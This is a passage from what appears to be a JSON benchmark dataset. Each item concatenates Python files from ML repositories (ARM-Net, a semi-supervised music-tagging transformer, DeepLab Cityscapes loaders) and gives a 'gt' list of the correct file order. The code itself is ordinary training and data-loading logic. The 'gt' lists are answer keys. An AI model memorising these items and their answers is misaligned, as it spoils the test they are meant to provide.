bias=False)\n        self.Wk = nn.Linear(nemb, nemb, bias=False)\n        self.Wv = nn.Linear(nemb, nemb, bias=False)\n\n    def forward(self, x):\n\n        query, key, value = self.Wq(x), self.Wk(x), self.Wv(x)\n        d_k = query.size(-1)\n        scores = torch.einsum('bxe,bye->bxy', query, key)\n        attn_weights = F.softmax(scores / math.sqrt(d_k), dim=-1)\n        return torch.einsum('bxy,bye->bxe', attn_weights, value), attn_weights\n\n\nclass scaled_dot_prodct_attention_(nn.Module):\n\n\n    def __init__(self, temperature, attn_dropout=0.):\n        super().__init__()\n        self.temperature = temperature\n        self.dropout = nn.Dropout(attn_dropout)\n\n    def forward(self, q, k, v, mask=None):\n\n        attn = torch.matmul(q / self.temperature, k.transpose(2, 3))\n\n        if mask is not None:\n            attn = attn.masked_fill(mask == 0, -1e9)\n\n        attn = self.dropout(F.softmax(attn, dim=-1))\n        output = torch.matmul(attn, v)\n\n        return output, attn\n\n\nclass MultiHeadAttention(nn.Module):\n\n    def __init__(self, nhead, ninput, n_k, n_v, dropout=0.):\n        super(MultiHeadAttention, self).__init__()\n        self.nhead, self.n_k, self.n_v = nhead, n_k, n_v\n\n        self.Wq = nn.Linear(ninput, nhead*n_k, bias=False)\n        self.Wk = nn.Linear(ninput, nhead*n_k, bias=False)\n        self.Wv = nn.Linear(ninput, nhead*n_v, bias=False)\n\n        self.attn_layer = scaled_dot_prodct_attention_(temperature=n_k**0.5)\n\n        self.dropout = nn.Dropout(p=dropout)\n        self.layer_norm = nn.LayerNorm(ninput, eps=1e-6)\n\n        self.fc = nn.Linear(nhead*n_v, ninput, bias=False)\n\n    def forward(self, x, mask=None):\n\n        bsz, seq_len = x.size(0), x.size(1)\n        residual = x\n\n        query = self.Wq(x).view(bsz, seq_len, self.nhead, self.n_k)\n        key = self.Wk(x).view(bsz, seq_len, self.nhead, self.n_k)\n        value = self.Wv(x).view(bsz, seq_len, self.nhead, self.n_v)\n\n        q, k, v = query.transpose(1, 2), key.transpose(1, 2), value.transpose(1, 2)\n\n        if mask is not None:\n            mask = mask.unsqueeze(1)\n\n        y, attn = self.attn_layer(q, k, v, mask=mask)\n\n        y = y.transpose(1, 2).contiguous().view(bsz, seq_len, -1)\n        y = self.dropout(self.fc(y))\n        y += residual\n        y = self.layer_norm(y)\n        return y, attn\n\n'ARM-Net/train.py'\n:import os\nimport time\nimport argparse\n\nimport torch\nfrom torch import nn\nimport torch.backends.cudnn as cudnn\nfrom torch import optim\n\nfrom data_loader import libsvm_dataloader\nfrom models.model_utils import create_model\nfrom utils.utils import logger, remove_logger, AverageMeter, timeSince, roc_auc_compute_fn, seed_everything\n\n\ndef get_args():\n    parser = argparse.ArgumentParser(description='ARMOR framework')\n    parser.add_argument('--exp_name', default='test', type=str, help='exp name for log & checkpoint')\n\n    parser.add_argument('--model', default='armnet', type=str, help='model type, afn, arm etc')\n    parser.add_argument('--nfeat', type=int, default=5500, help='the number of features')\n    parser.add_argument('--nfield', type=int, default=10, help='the number of fields')\n    parser.add_argument('--nemb', type=int, default=10, help='embedding size')\n    parser.add_argument('--k', type=int, default=3, help='interaction order for hofm/dcn/cin/gcn/gat/xdfm')\n    parser.add_argument('--h', type=int, default=600, help='afm/cin/afn/armnet/gcn/gat hidden features/neurons')\n    parser.add_argument('--mlp_nlayer', type=int, default=2, help='the number of mlp layers')\n    parser.add_argument('--mlp_nhid', type=int, default=300, help='mlp hidden units')\n    parser.add_argument('--dropout', default=0.0, type=float, help='dropout rate')\n    parser.add_argument('--nattn_head', type=int, default=4, help='the number of attention heads, gat/armnet')\n\n    parser.add_argument('--ensemble', action='store_true', default=False, help='to ensemble with DNNs')\n    parser.add_argument('--dnn_nlayer', type=int, default=2, help='the number of mlp layers')\n    parser.add_argument('--dnn_nhid', type=int, default=300, help='mlp hidden units')\n    parser.add_argument('--alpha', default=1.7, type=float, help='entmax alpha to control sparsity')\n\n    parser.add_argument('--epoch', type=int, default=100, help='number of maximum epochs')\n    parser.add_argument('--patience', type=int, default=1, help='number of epochs for stopping training')\n    parser.add_argument('--batch_size', type=int, default=4096, help='batch size')\n    parser.add_argument('--lr', default=0.003, type=float, help='learning rate, default 3e-3')\n    parser.add_argument('--eval_freq', type=int, default=10000, help='max number of batches to train per epoch')\n\n    parser.add_argument('--dataset', type=str, default='frappe', help='dataset name for data_loader')\n    parser.add_argument('--data_dir', type=str, default='./data/', help='path to dataset')\n    parser.add_argument('--workers', default=4, type=int, help='number of data loading workers')\n\n    parser.add_argument('--log_dir', type=str, default='./log/', help='path to dataset')\n    parser.add_argument('--report_freq', type=int, default=30, help='report frequency')\n    parser.add_argument('--seed', type=int, default=2020, help='seed for reproducibility')\n    parser.add_argument('--repeat', type=int, default=1, help='number of repeats with seeds [seed, seed+repeat)')\n    args = parser.parse_args()\n    return args\n\n\ndef main():\n    global best_valid_auc, start_time\n    plogger = logger(f'{args.log_dir}{args.exp_name}/stdout.log', True, True)\n\n    model = create_model(args, plogger)\n    plogger.info(vars(args))\n\n    opt_metric = nn.BCEWithLogitsLoss(reduction='mean')\n    if torch.cuda.is_available(): opt_metric = opt_metric.cuda()\n    optimizer = optim.Adam(model.parameters(), lr=args.lr)\n\n    for p in model.parameters():\n        p.register_hook(lambda grad: torch.clamp(grad, -1., 1.))\n    cudnn.benchmark = True\n\n    patience_cnt = 0\n    for epoch in range(args.epoch):\n        plogger.info(f'Epoch [{epoch:3d}/{args.epoch:3d}]')\n\n        run(epoch, model, train_loader, opt_metric, plogger, optimizer=optimizer)\n        valid_auc = run(epoch, model, val_loader, opt_metric, plogger, namespace='val')\n        test_auc = run(epoch, model, test_loader, opt_metric, plogger, namespace='test')\n\n\n        if valid_auc >= best_valid_auc:\n            patience_cnt = 0\n            best_valid_auc, best_test_auc = valid_auc, test_auc\n            plogger.info(f'best valid auc: valid {valid_auc:.4f}, test {test_auc:.4f}')\n        else:\n            patience_cnt += 1\n            plogger.info(f'valid {valid_auc:.4f}, test {test_auc:.4f}')\n            plogger.info(f'Early stopped, {patience_cnt}-th best auc at epoch {epoch-1}')\n        if patience_cnt >= args.patience:\n            plogger.info(f'Final best valid auc {best_valid_auc:.4f}, with test auc {best_test_auc:.4f}')\n            break\n\n    plogger.info(f'Total running time: {timeSince(since=start_time)}')\n    remove_logger(plogger)\n\n\n\ndef run(epoch, model, data_loader, opt_metric, plogger, optimizer=None, namespace='train'):\n    if optimizer: model.train()\n    else: model.eval()\n\n    time_avg, timestamp = AverageMeter(), time.time()\n    loss_avg, auc_avg = AverageMeter(), AverageMeter()\n\n    for batch_idx, batch in enumerate(data_loader):\n        target = batch['y']\n        if torch.cuda.is_available():\n            batch['id'] = batch['id'].cuda(non_blocking=True)\n            batch['value'] = batch['value'].cuda(non_blocking=True)\n            target = target.cuda(non_blocking=True)\n\n        if namespace == 'train':\n            y = model(batch)\n            loss = opt_metric(y, target)\n\n            optimizer.zero_grad()\n            loss.backward()\n            optimizer.step()\n        else:\n            with torch.no_grad():\n                y = model(batch)\n                loss = opt_metric(y, target)\n\n        auc = roc_auc_compute_fn(y, target)\n        loss_avg.update(loss.item(), target.size(0))\n        auc_avg.update(auc, target.size(0))\n\n        time_avg.update(time.time() - timestamp)\n        timestamp = time.time()\n        if batch_idx % args.report_freq == 0:\n            plogger.info(f'Epoch [{epoch:3d}/{args.epoch}][{batch_idx:3d}/{len(data_loader)}]\\t'\n                         f'{time_avg.val:.3f} ({time_avg.avg:.3f}) AUC {auc_avg.val:4f} ({auc_avg.avg:4f}) '\n                         f'Loss {loss_avg.val:8.4f} ({loss_avg.avg:8.4f})')\n\n\n        if batch_idx >= args.eval_freq: break\n\n    plogger.info(f'{namespace}\\tTime {timeSince(s=time_avg.sum):>12s} '\n                 f'AUC {auc_avg.avg:8.4f} Loss {loss_avg.avg:8.4f}')\n    return auc_avg.avg\n\n\n\nargs = get_args()\ntrain_loader, val_loader, test_loader = libsvm_dataloader(args)\nstart_time, best_valid_auc, base_exp_name = time.time(), 0., args.exp_name\nfor args.seed in range(args.seed, args.seed+args.repeat):\n    seed_everything(args.seed)\n    args.exp_name = f'{base_exp_name}_{args.seed}'\n    if not os.path.isdir(f'log/{args.exp_name}'): os.makedirs(f'log/{args.exp_name}', exist_ok=True)\n    main()\n    start_time, best_valid_auc = time.time(), 0.\n\n'ARM-Net/models/dnn.py'\n:import torch\nfrom models.layers import Embedding, MLP\n\nclass DNNModel(torch.nn.Module):\n\n    def __init__(self, nfield, nfeat, nemb, mlp_layers, mlp_hid, dropout):\n        super().__init__()\n        self.embedding = Embedding(nfeat, nemb)\n        self.mlp_ninput = nfield*nemb\n        self.mlp = MLP(self.mlp_ninput, mlp_layers, mlp_hid, dropout)\n\n    def forward(self, x):\n\n        x_emb = self.embedding(x)\n        y = self.mlp(x_emb.view(-1, self.mlp_ninput))\n        return y.squeeze(1)",
        "gt": [
            "'ARM-Net/models/layers.py'",
            "'ARM-Net/models/dnn.py'",
            "'ARM-Net/models/model_utils.py'",
            "'ARM-Net/train.py'"
        ]
    },
    {
        "files": [
            "'semi-supervised-music-tagging-transformer/src/train.py'",
            "'semi-supervised-music-tagging-transformer/src/lightning_model.py'",
            "'semi-supervised-music-tagging-transformer/src/data_loader.py'"
        ],
        "content": "'semi-supervised-music-tagging-transformer/src/train.py'\n:import os\nimport torch\nimport logging\nimport argparse\nimport numpy as np\nimport pytorch_lightning as pl\n\nfrom torch import nn\nfrom models import MusicTaggingTransformer\nfrom lightning_model import PLModel\nfrom callbacks_loggers import get_loggers, get_callbacks\nfrom training_utils import DirManager\n\n\ndef train(args):\n    dir_manager = DirManager(output_dir=args.output_dir)\n\n\n    _network = MusicTaggingTransformer(\n        conv_ndim=args.conv_ndim,\n        n_mels=args.n_mels,\n        sample_rate=args.sample_rate,\n        n_fft=args.n_fft,\n        f_min=args.f_min,\n        f_max=args.f_max,\n        attention_ndim=args.attention_ndim,\n        attention_nheads=args.attention_nheads,\n        attention_nlayers=args.attention_nlayers,\n        attention_max_len=args.attention_max_len,\n        dropout=args.dropout,\n        n_seq_cls=args.n_seq_cls,\n        n_token_cls=args.n_token_cls,\n    )\n    if args.is_expansion:\n        _teacher_network = MusicTaggingTransformer(\n            conv_ndim=args.teacher_conv_ndim,\n            n_mels=args.n_mels,\n            sample_rate=args.sample_rate,\n            n_fft=args.n_fft,\n            f_min=args.f_min,\n            f_max=args.f_max,\n            attention_ndim=args.teacher_attention_ndim,\n            attention_nheads=args.teacher_attention_nheads,\n            attention_nlayers=args.teacher_attention_nlayers,\n            attention_max_len=args.attention_max_len,\n            dropout=args.dropout,\n            n_seq_cls=args.n_seq_cls,\n            n_token_cls=args.n_token_cls,\n        )\n        S = torch.load(args.teacher_model_path)\n        S = {k[8:]: v for k, v in S.items() if k[:7]!='teacher'}\n        _teacher_network.load_state_dict(S)\n    else:\n        _teacher_network = nn.Module()\n\n\n    num_gpus = torch.cuda.device_count()\n\n\n    callbacks = get_callbacks(patience=40, dir_manager=dir_manager, monitor='valid_loss')\n    checkpoint_callback = pl.callbacks.ModelCheckpoint(dirpath=args.output_dir, save_top_k=1, verbose=True, monitor='valid_loss', mode='min')\n    loggers = get_loggers(tb_save_dir=dir_manager.tensorboard_dir)\n\n\n    model = PLModel(\n        data_path=args.data_path,\n        network=_network,\n        teacher_network=_teacher_network,\n        loss_function=nn.BCELoss(),\n        learning_rate=args.learning_rate,\n        optimizer_class=torch.optim.Adam,\n        batch_size=args.batch_size,\n        num_samples=args.input_length,\n        num_chunks=args.num_chunks,\n        num_workers=args.num_workers,\n        is_augmentation=args.is_augmentation,\n        is_expansion=args.is_expansion,\n    )\n\n\n    trainer = pl.Trainer(\n        gpus=num_gpus,\n        num_nodes=args.num_nodes,\n        logger=loggers,\n        callbacks=callbacks,\n        max_epochs=args.max_epochs,\n        checkpoint_callback=checkpoint_callback,\n        sync_batchnorm=True,\n        reload_dataloaders_every_epoch=True,\n        resume_from_checkpoint=None,\n        num_sanity_val_steps=2,\n        automatic_optimization=True,\n        replace_sampler_ddp=False,\n        accelerator=\"ddp\",\n        multiple_trainloader_mode='max_size_cycle',\n    )\n    trainer.fit(model)\n    logging.info('Training is done. Exporting the best model..')\n\n\n    model = PLModel.load_from_checkpoint(trainer.checkpoint_callback.best_model_path)\n    torch.save(model.state_dict(), dir_manager.best_model_statedict)\n    logging.info('Best performing model was exported to onnx and torchscript.')\n\n\nif __name__ == '__main__':\n    parser = argparse.ArgumentParser(formatter_class=argparse.ArgumentDefaultsHelpFormatter)\n\n    parser.add_argument('--num_workers', type=int, default=0)\n    parser.add_argument('--mode', type=str, default='TRAIN', choices=['TRAIN', 'TEST'])\n    parser.add_argument('--is_augmentation', type=bool, default=False)\n    parser.add_argument('--is_expansion', type=bool, default=False)\n\n\n    parser.add_argument('--n_mels', type=int, default=128)\n    parser.add_argument('--n_fft', type=int, default=1024)\n    parser.add_argument('--f_min', type=int, default=0)\n    parser.add_argument('--f_max', type=int, default=11025)\n    parser.add_argument('--sample_rate', type=int, default=22050)\n\n\n    parser.add_argument('--batch_size', type=int, default=32)\n    parser.add_argument('--num_chunks', type=int, default=8)\n    parser.add_argument('--input_length', type=int, default=220500)\n\n\n    parser.add_argument('--conv_ndim', type=int, default=128)\n    parser.add_argument('--attention_ndim', type=int, default=256)\n    parser.add_argument('--attention_nheads', type=int, default=8)\n    parser.add_argument('--attention_nlayers', type=int, default=4)\n    parser.add_argument('--attention_max_len', type=int, default=512)\n    parser.add_argument('--dropout', type=float, default=0.1)\n    parser.add_argument('--n_seq_cls', type=int, default=50)\n    parser.add_argument('--n_token_cls', type=int, default=1)\n\n\n    parser.add_argument('--teacher_conv_ndim', type=int, default=128)\n    parser.add_argument('--teacher_attention_ndim', type=int, default=256)\n    parser.add_argument('--teacher_attention_nheads', type=int, default=8)\n    parser.add_argument('--teacher_attention_nlayers', type=int, default=4)\n\n\n    parser.add_argument('--max_epochs', type=int, default=200)\n    parser.add_argument('--gpu_id', type=str, default=0)\n    parser.add_argument('--num_nodes', type=int, default=1)\n    parser.add_argument('--learning_rate', type=float, default=1e-4)\n\n\n    parser.add_argument('--data_path', type=str, default='./../data/')\n    parser.add_argument('--output_dir', type=str, default='./results/exp')\n    parser.add_argument('--teacher_model_path', type=str, default='./results/exp')\n\n\n    args = parser.parse_args()\n\n    print(args)\n    train(args)\n\n'semi-supervised-music-tagging-transformer/src/lightning_model.py'\n:import math\nimport random\nimport torch\nimport torchaudio\nimport logging\nimport numpy as np\nimport pytorch_lightning as pl\n\nfrom torch import nn\nfrom sklearn import metrics\n\nfrom msd_config import MSDConfig\nfrom data_loader import msd_dataloader\n\n\nclass PLModel(pl.LightningModule):\n    def __init__(\n        self,\n        data_path,\n        network,\n        teacher_network,\n        loss_function,\n        learning_rate,\n        optimizer_class,\n        batch_size,\n        num_samples,\n        num_chunks=1,\n        num_workers=1,\n        is_augmentation=False,\n        is_expansion=False,\n    ):\n\n        super().__init__()\n        self.data_path = data_path\n        self.network = network\n        self.teacher_network = teacher_network\n        self.loss_function = loss_function\n        self.learning_rate = learning_rate\n        self.optimizer_class = optimizer_class\n        self.batch_size = batch_size\n        self.num_samples = num_samples\n        self.num_chunks = num_chunks\n        self.num_workers = num_workers\n        self.is_augmentation = is_augmentation\n        self.is_expansion = is_expansion\n\n        self.save_hyperparameters()\n        logging.info('Building pytorch lightning model - done')\n\n        self.eval_logits = []\n        self.eval_targets = []\n\n    def train_dataloader(self):\n        if self.is_expansion:\n            labeled_loader = self.get_labeled_dataloader(data_split='TRAIN',\n                                                         batch_size=self.batch_size//2,\n                                                         is_agumentation=self.is_augmentation)\n            unlabeled_loader = self.get_unlabeled_dataloader(batch_size=self.batch_size//2)\n            loaders = {\n                        'labeled': labeled_loader,\n                        'unlabeled': unlabeled_loader\n                       }\n            return loaders\n        else:\n            return self.get_labeled_dataloader(data_split='TRAIN',\n                                               batch_size=self.batch_size,\n                                               is_augmentation=self.is_augmentation)\n\n    def val_dataloader(self):\n        return self.get_labeled_dataloader(data_split='VALID',\n                                           batch_size=self.batch_size//self.num_chunks,\n                                           is_augmentation=False,\n                                           num_chunks=self.num_chunks)\n\n    def test_dataloader(self):\n        return self.get_labeled_dataloader(data_split='TEST',\n                                           batch_size=self.batch_size//self.num_chunks,\n                                           is_augmentation=False,\n                                           num_chunks=self.num_chunks)\n\n    def get_labeled_dataloader(self, data_split, batch_size, is_augmentation, num_chunks=1):\n        return msd_dataloader(data_path=self.data_path, data_split=data_split, batch_size=batch_size, num_samples=self.num_samples, num_workers=self.num_workers, num_chunks=1, is_augmentation=is_augmentation)\n\n    def get_unlabeled_dataloader(self, batch_size):\n        return msd_dataloader(data_path=self.data_path, data_split='STUDENT', batch_size=batch_size, num_samples=self.num_samples, num_workers=self.num_workers, num_chunks=1)\n\n    def training_step(self, batch, batch_idx):\n\n        if self.is_expansion:\n            wav, target_tag_binary = batch['labeled']\n            wav = wav.squeeze(1)\n            original_wav, noised_wav = batch['unlabeled']\n            original_wav = original_wav.squeeze(1)\n            noised_wav = noised_wav.squeeze(1)\n\n\n            teacher_input = torch.cat([wav, original_wav])\n            student_input = torch.cat([wav, noised_wav])\n\n\n            self.teacher_network.eval()\n            with torch.no_grad():\n                teacher_output = self.teacher_network.forward(teacher_input)\n                teacher_prd = teacher_output[:len(wav)]\n                pseudo_label = teacher_output[len(wav):]\n\n\n            logits = self.network.forward(student_input)\n\n\n            teacher_loss = self.skeptical_loss(logits[:len(wav)], target_tag_binary, teacher_prd)\n            student_loss = self.loss_function(logits[len(wav):], pseudo_label)\n            loss = teacher_loss + student_loss\n\n        else:\n            wav, target_tag_binary = batch\n            wav = wav.squeeze(1)\n            logits = self.network.forward(wav)\n            loss = self.loss_function(logits, target_tag_binary)\n\n        self.log('train_loss_step', loss)\n        return {'loss': loss}\n\n    def validation_step(self, batch, batch_idx):\n        wav, target_tag_binary = batch\n        b, c, t = wav.size()\n        logits = self.network.forward(wav.view(-1, t))\n        logits = logits.view(b, c, -1).mean(dim=1)\n        loss = self.loss_function(logits, target_tag_binary)\n        self.log('valid_loss_step', loss, sync_dist=True)\n        self.eval_logits.append(logits.detach().cpu())\n        self.eval_targets.append(target_tag_binary.detach().cpu())\n\n    def test_step(self, batch, batch_idx):\n        wav, target_tag_binary = batch\n        b, c, t = wav.size()\n        logits = self.network.forward(wav.view(-1, t))\n        logits = logits.view(b, c, -1).mean(dim=1)\n        loss = self.loss_function(logits, target_tag_binary)\n        self.log('test_loss_step', loss, on_epoch=True)\n        self.eval_logits.append(logits.detach().cpu())\n        self.eval_targets.append(target_tag_binary.detach().cpu())\n\n    def configure_optimizers(self):\n        optimizer = self.optimizer_class(self.network.parameters(), lr=self.learning_rate)\n        return optimizer\n\n    def validation_epoch_end(self, outputs):\n        logits = torch.cat(self.eval_logits, dim=0)\n        target_binaries = torch.cat(self.eval_targets, dim=0)\n        loss = self.loss_function(logits, target_binaries)\n        roc_auc, pr_auc = self.get_auc_scores(logits, target_binaries)\n        self.log('valid_loss', loss.cuda(), sync_dist=True)\n        self.log('valid_roc_auc', roc_auc.cuda(), sync_dist=True)\n        self.log('valid_pr_auc', pr_auc.cuda(), sync_dist=True)\n        self.eval_logits = []\n        self.eval_targets = []\n\n    def test_epoch_end(self, outputs):\n        logits = torch.cat(self.eval_logits, dim=0)\n        target_binaries = torch.cat(self.eval_targets, dim=0)\n        loss = self.loss_function(logits, target_binaries)\n        roc_auc, pr_auc = self.get_auc_scores(logits, target_binaries)\n        self.eval_logits = []\n        self.eval_targets = []\n\n    def get_auc_scores(self, logits, targets):\n        try:\n            roc_auc = metrics.roc_auc_score(targets, logits, average='macro')\n            pr_auc = metrics.average_precision_score(targets, logits, average='macro')\n            print('roc_auc: %.4f' % roc_auc)\n            print('pr_auc: %.4f' % pr_auc)\n\n\n            roc_aucs = metrics.roc_auc_score(targets, logits, average=None)\n            pr_aucs = metrics.average_precision_score(targets, logits, average=None)\n            for i in range(50):\n                print('%s: %.4f, %.4f' % (MSDConfig.tag_names[i], roc_aucs[i], pr_aucs[i]))\n        except ValueError as e:\n            roc_auc, pr_auc = 0, 0\n            print('auc not available')\n        return torch.tensor(roc_auc), torch.tensor(pr_auc)\n\n'semi-supervised-music-tagging-transformer/src/data_loader.py'\n:\nimport os\nimport random\nimport pickle\nimport torch\nimport numpy as np\nimport soundfile as sf\nfrom torch.utils import data\nfrom torchaudio_augmentations import (\n    RandomResizedCrop,\n    RandomApply,\n    PolarityInversion,\n    Noise,\n    Gain,\n    HighLowPass,\n    Delay,\n    PitchShift,\n    Reverb,\n    Compose,\n)\n\n\nclass MSDDataset(data.Dataset):\n    def __init__(self, data_path, data_split, num_samples, num_chunks, is_augmentation):\n        assert data_split in ['TRAIN', 'VALID', 'TEST', 'STUDENT', 'NONE']\n        self.data_path = data_path\n        self.data_split = data_split\n        self.num_samples = num_samples\n        self.num_chunks = num_chunks\n        self.is_augmentation = is_augmentation\n        self._load_data()\n        if is_augmentation or (data_split=='STUDENT'):\n            self._get_augmentations()\n\n    def __getitem__(self, index):\n        wav = self._read_audio(index)\n        if self.data_split == 'TRAIN':\n            wav = self._process_train(wav)\n            binary = self.binaries[index].astype('float32')\n            return wav, binary\n        elif self.data_split in ['VALID', 'TEST']:\n            wav = self._process_valid(wav)\n            binary = self.binaries[index].astype('float32')\n            return wav, binary\n        elif self.data_split == 'STUDENT':\n            original_wav, noisy_wav = self._process_student(wav)\n            return original_wav, noisy_wav\n\n    def _load_data(self):\n        split_fn = os.path.join(self.data_path, 'splits', '%s_ids.npy' % self.data_split.lower())\n        self.track_ids = np.load(split_fn)\n        if self.data_split in ['TRAIN', 'VALID', 'TEST']:\n            binary_fn = os.path.join(self.data_path, 'splits', '%s_binaries.npy' % self.data_split.lower())\n            self.binaries = np.load(binary_fn)\n\n    def _get_augmentations(self):\n\n        transforms = [\n            RandomResizedCrop(n_samples=self.num_samples),\n            RandomApply([PolarityInversion()], p=0.8),\n            RandomApply([Noise(min_snr=0.3, max_snr=0.5)], p=0.3),\n            RandomApply([Gain()], p=0.2),\n            RandomApply([HighLowPass(sample_rate=22050)], p=0.8),\n            RandomApply([Delay(sample_rate=22050)], p=0.5),\n            RandomApply([PitchShift(n_samples=self.num_samples, sample_rate=22050)], p=0.4),\n            RandomApply([Reverb(sample_rate=22050)], p=0.3),\n        ]\n        self.augmentation = Compose(transforms=transforms)\n\n    def _read_audio(self, index):\n\n        track_id = self.track_ids[index]\n        filename = '{}/{}/{}/{}.wav'.format(track_id[2], track_id[3], track_id[4], track_id)\n        audio_path = os.path.join(self.data_path, 'audio', filename)\n\n\n        wav, _ = sf.read(audio_path)\n\n\n        if len(wav.shape) == 2:\n            wav = np.mean(wav, axis=1)\n        return wav\n\n    def _process_train(self, wav):\n\n        random_index = random.randint(0, len(wav) - self.num_samples - 1)\n        wav = wav[random_index : random_index + self.num_samples].astype('float32')\n        if self.is_augmentation:\n            wav = self.augmentation(torch.from_numpy(wav).unsqueeze(0)).squeeze(0).numpy()\n        return wav\n\n    def _process_valid(self, wav):\n\n        hop = (len(wav) - self.num_samples) // self.num_chunks\n        wav = np.array([wav[i * hop : i * hop + self.num_samples] for i in range(self.num_chunks)]).astype('float32')\n        return wav\n\n    def _process_student(self, wav):\n\n        random_index = random.randint(0, len(wav) - self.num_samples - 1)\n        original_wav = wav[random_index : random_index + self.num_samples].astype('float32')\n        noisy_wav = self.augmentation(torch.from_numpy(original_wav).unsqueeze(0)).squeeze(0).numpy()\n        return original_wav, noisy_wav\n\n    def __len__(self):\n        return len(self.track_ids)\n\n\ndef msd_dataloader(data_path, data_split, batch_size, num_samples, num_workers, num_chunks, is_augmentation=False):\n    data_loader = data.DataLoader(dataset=MSDDataset(data_path, data_split, num_samples, num_chunks, is_augmentation),\n                                  batch_size=batch_size,\n                                  shuffle=True,\n                                  drop_last=False,\n                                  num_workers=num_workers)\n    return data_loader\n\n",
        "gt": [
            "'semi-supervised-music-tagging-transformer/src/data_loader.py'",
            "'semi-supervised-music-tagging-transformer/src/lightning_model.py'",
            "'semi-supervised-music-tagging-transformer/src/train.py'"
        ]
    },
    {
        "files": [
            "'pytorch-deeplab-xception/dataloaders/__init__.py'",
            "'pytorch-deeplab-xception/dataloaders/datasets/cityscapes.py'",
            "'pytorch-deeplab-xception/dataloaders/custom_transforms.py'",
            "'pytorch-deeplab-xception/train.py'"
        ],
        "content": "'pytorch-deeplab-xception/dataloaders/__init__.py'\n:from dataloaders.datasets import cityscapes, coco, combine_dbs, pascal, sbd\nfrom torch.utils.data import DataLoader\n\ndef make_data_loader(args, **kwargs):\n\n    if args.dataset == 'pascal':\n        train_set = pascal.VOCSegmentation(args, split='train')\n        val_set = pascal.VOCSegmentation(args, split='val')\n        if args.use_sbd:\n            sbd_train = sbd.SBDSegmentation(args, split=['train', 'val'])\n            train_set = combine_dbs.CombineDBs([train_set, sbd_train], excluded=[val_set])\n\n        num_class = train_set.NUM_CLASSES\n        train_loader = DataLoader(train_set, batch_size=args.batch_size, shuffle=True, **kwargs)\n        val_loader = DataLoader(val_set, batch_size=args.batch_size, shuffle=False, **kwargs)\n        test_loader = None\n\n        return train_loader, val_loader, test_loader, num_class\n\n    elif args.dataset == 'cityscapes':\n        train_set = cityscapes.CityscapesSegmentation(args, split='train')\n        val_set = cityscapes.CityscapesSegmentation(args, split='val')\n        test_set = cityscapes.CityscapesSegmentation(args, split='test')\n        num_class = train_set.NUM_CLASSES\n        train_loader = DataLoader(train_set, batch_size=args.batch_size, shuffle=True, **kwargs)\n        val_loader = DataLoader(val_set, batch_size=args.batch_size, shuffle=False, **kwargs)\n        test_loader = DataLoader(test_set, batch_size=args.batch_size, shuffle=False, **kwargs)\n\n        return train_loader, val_loader, test_loader, num_class\n\n    elif args.dataset == 'coco':\n        train_set = coco.COCOSegmentation(args, split='train')\n        val_set = coco.COCOSegmentation(args, split='val')\n        num_class = train_set.NUM_CLASSES\n        train_loader = DataLoader(train_set, batch_size=args.batch_size, shuffle=True, **kwargs)\n        val_loader = DataLoader(val_set, batch_size=args.batch_size, shuffle=False, **kwargs)\n        test_loader = None\n        return train_loader, val_loader, test_loader, num_class\n\n    else:\n        raise NotImplementedError\n\n\n'pytorch-deeplab-xception/dataloaders/datasets/cityscapes.py'\n:import os\nimport numpy as np\nimport scipy.misc as m\nfrom PIL import Image\nfrom torch.utils import data\nfrom mypath import Path\nfrom torchvision import transforms\nfrom dataloaders import custom_transforms as tr\n\nclass CityscapesSegmentation(data.Dataset):\n    NUM_CLASSES = 19\n\n    def __init__(self, args, root=Path.db_root_dir('cityscapes'), split=\"train\"):\n\n        self.root = root\n        self.split = split\n        self.args = args\n        self.files = {}\n\n        self.images_base = os.path.join(self.root, 'leftImg8bit', self.split)\n        self.annotations_base = os.path.join(self.root, 'gtFine_trainvaltest', 'gtFine', self.split)\n\n        self.files[split] = self.recursive_glob(rootdir=self.images_base, suffix='.png')\n\n        self.void_classes = [0, 1, 2, 3, 4, 5, 6, 9, 10, 14, 15, 16, 18, 29, 30, -1]\n        self.valid_classes = [7, 8, 11, 12, 13, 17, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 31, 32, 33]\n        self.class_names = ['unlabelled', 'road', 'sidewalk', 'building', 'wall', 'fence', \\\n                            'pole', 'traffic_light', 'traffic_sign', 'vegetation', 'terrain', \\\n                            'sky', 'person', 'rider', 'car', 'truck', 'bus', 'train', \\\n                            'motorcycle', 'bicycle']\n\n        self.ignore_index = 255\n        self.class_map = dict(zip(self.valid_classes, range(self.NUM_CLASSES)))\n\n        if not self.files[split]:\n            raise Exception(\"No files for split=[%s] found in %s\" % (split, self.images_base))\n\n        print(\"Found %d %s images\" % (len(self.files[split]), split))\n\n    def __len__(self):\n        return len(self.files[self.split])\n\n    def __getitem__(self, index):\n\n        img_path = self.files[self.split][index].rstrip()\n        lbl_path = os.path.join(self.annotations_base,\n                                img_path.split(os.sep)[-2],\n                                os.path.basename(img_path)[:-15] + 'gtFine_labelIds.png')\n\n        _img = Image.open(img_path).convert('RGB')\n        _tmp = np.array(Image.open(lbl_path), dtype=np.uint8)\n        _tmp = self.encode_segmap(_tmp)\n        _target = Image.fromarray(_tmp)\n\n        sample = {'image': _img, 'label': _target}\n\n        if self.split == 'train':\n            return self.transform_tr(sample)\n        elif self.split == 'val':\n            return self.transform_val(sample)\n        elif self.split == 'test':\n            return self.transform_ts(sample)\n\n    def encode_segmap(self, mask):\n\n        for _voidc in self.void_classes:\n            mask[mask == _voidc] = self.ignore_index\n        for _validc in self.valid_classes:\n            mask[mask == _validc] = self.class_map[_validc]\n        return mask\n\n    def recursive_glob(self, rootdir='.', suffix=''):\n\n        return [os.path.join(looproot, filename)\n                for looproot, _, filenames in os.walk(rootdir)\n                for filename in filenames if filename.endswith(suffix)]\n\n    def transform_tr(self, sample):\n        composed_transforms = transforms.Compose([\n            tr.RandomHorizontalFlip(),\n            tr.RandomScaleCrop(base_size=self.args.base_size, crop_size=self.args.crop_size, fill=255),\n            tr.RandomGaussianBlur(),\n            tr.Normalize(mean=(0.485, 0.456, 0.406), std=(0.229, 0.224, 0.225)),\n            tr.ToTensor()])\n\n        return composed_transforms(sample)\n\n    def transform_val(self, sample):\n\n        composed_transforms = transforms.Compose([\n            tr.FixScaleCrop(crop_size=self.args.crop_size),\n            tr.Normalize(mean=(0.485, 0.456, 0.406), std=(0.229, 0.224, 0.225)),\n            tr.ToTensor()])\n\n        return composed_transforms(sample)\n\n    def transform_ts(self, sample):\n\n        composed_transforms = transforms.Compose([\n            tr.FixedResize(size=self.args.crop_size),\n            tr.Normalize(mean=(0.485, 0.456, 0.406), std=(0.229, 0.224, 0.225)),\n            tr.ToTensor()])\n\n        return 